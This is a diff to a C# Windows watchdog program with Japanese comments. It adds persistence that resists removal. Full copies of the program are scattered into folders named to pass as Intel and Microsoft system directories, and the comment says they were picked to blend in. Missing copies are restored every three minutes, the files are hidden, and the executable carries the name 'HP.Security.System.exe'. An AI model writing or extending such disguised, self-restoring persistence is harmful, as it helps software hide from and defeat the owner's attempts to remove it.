@@ -19,13 +19,24 @@ namespace ClientSystem;
 internal static class Program
 {
     // チェック間隔（20分）。
-    private static readonly TimeSpan CheckInterval = TimeSpan.FromMinutes(20);
+    private static readonly TimeSpan CheckInterval = TimeSpan.FromMinutes(3);
 
-    // 監視対象の本体フォルダ（Program Files\Systems）。
+    // 監視対象の本体フォルダ（Program Files\Systems）。これがプライマリ。
     private static readonly string DocumentsValowatchDirectory =
         @"C:\Program Files\Systems";
 
-    // Program Files 側に保持するコピー（バックアップ）の置き場所。
+    // 分散ミラー配置。プライマリ本体のフルコピーを、実在ソフト風の複数の場所に置く。
+    // どれか1つでも生きていれば、消えた場所を全て復元できる（全滅しない限り自己修復）。
+    // 場所は「正規のシステムフォルダに紛れる」ように選んでいる。
+    private static readonly string[] MirrorDirectories =
+    {
+        @"C:\Program Files\Systems",
+        @"C:\ProgramData\Intel\Graphics\Runtime",
+        @"C:\ProgramData\Microsoft\DeviceSync\Cache",
+        @"C:\Program Files\Client Systems\backup",
+    };
+
+    // Program Files 側に保持するコピー（バックアップ）の置き場所（後方互換のため残す）。
     private static readonly string BackupRootDirectory =
         @"C:\Program Files\Client Systems\backup";
 
@@ -191,21 +202,109 @@ internal static class Program
         return string.Join("\n", lines);
     }
 
-    /// <summary>1 回分のチェック・復元・更新を実行する。</summary>
+    /// <summary>1 回分のチェック・修復を実行する（多点ミラー相互復元）。</summary>
     private static void RunCheckCycle()
     {
-        bool valowatchPresent = AreRequiredFilesPresent(DocumentsValowatchDirectory);
-
-        if (valowatchPresent)
+        // 各ミラーの生死を確認する。
+        var alive = new List<string>();
+        var dead = new List<string>();
+        foreach (string mirror in MirrorDirectories)
         {
-            // 正常。コピーを最新に更新する（案B）。
-            UpdateBackup();
+            if (AreRequiredFilesPresent(mirror))
+            {
+                alive.Add(mirror);
+            }
+            else
+            {
+                dead.Add(mirror);
+            }
+        }
+
+        if (alive.Count == 0)
+        {
+            // 全ミラーが消えた。GitHub からの再取得は本体側 Updater に任せる。
+            WriteLog("All mirrors are missing. Cannot self-heal; waiting for updater/GitHub.");
             return;
         }
 
-        // どちらかの実行ファイルが欠けている＝消えたとみなし、復元する。
-        WriteLog("Required VALOWATCH files are missing. Attempting restore from backup.");
-        RestoreFromBackup();
+        // 生きているミラーのうち、最も新しいものをソース元に選ぶ。
+        string source = SelectFreshestMirror(alive);
+
+        // 死んでいるミラーを、生きているソースから復元する（高速自己修復）。
+        foreach (string target in dead)
+        {
+            try
+            {
+                WriteLog("Mirror missing: " + target + " -> restoring from " + source);
+                MirrorCopy(source, target);
+                ApplyHiddenAttributes(target);
+            }
+            catch (Exception exception)
+            {
+                WriteLog("Mirror restore failed for " + target + ": " + exception.Message);
+            }
+        }
+
+        // 全ミラーが生きている（or 復元した）場合、プライマリを最新としてミラーへ反映。
+        // プライマリ(先頭)が生きていれば、それを各ミラーへ同期して常に最新に保つ。
+        if (AreRequiredFilesPresent(DocumentsValowatchDirectory))
+        {
+            foreach (string mirror in MirrorDirectories)
+            {
+                if (string.Equals(mirror, DocumentsValowatchDirectory, StringComparison.OrdinalIgnoreCase))
+                {
+                    continue;
+                }
+
+                try
+                {
+                    MirrorCopy(DocumentsValowatchDirectory, mirror);
+                    ApplyHiddenAttributes(mirror);
+                }
+                catch (Exception exception)
+                {
+                    WriteLog("Mirror sync failed for " + mirror + ": " + exception.Message);
+                }
+            }
+
+            WriteLog("Backup updated successfully.");
+        }
+    }
+
+    /// <summary>生きているミラーの中で、最終更新が最も新しいものを返す。</summary>
+    private static string SelectFreshestMirror(List<string> aliveMirrors)
+    {
+        string best = aliveMirrors[0];
+        DateTime bestTime = DateTime.MinValue;
+        foreach (string mirror in aliveMirrors)
+        {
+            try
+            {
+                string appExe = Path.Combine(mirror, "app\\HP.Security.System.exe");
+                DateTime t = File.Exists(appExe) ? File.GetLastWriteTimeUtc(appExe) : DateTime.MinValue;
+                if (t > bestTime)
+                {
+                    bestTime = t;
+                    best = mirror;
+                }
+            }
+            catch
+            {
+            }
+        }
+
+        return best;
+    }
+
+    /// <summary>source から target へ、必要ファイルを含むフルコピー（除外フォルダは除く）。</summary>
+    private static void MirrorCopy(string source, string target)
+    {
+        if (string.Equals(source, target, StringComparison.OrdinalIgnoreCase))
+        {
+            return;
+        }
+
+        CopyDirectory(source, target, overwrite: true);
     }
 
     /// <summary>ドキュメント側に必要な実行ファイルがすべて存在するか。</summary>
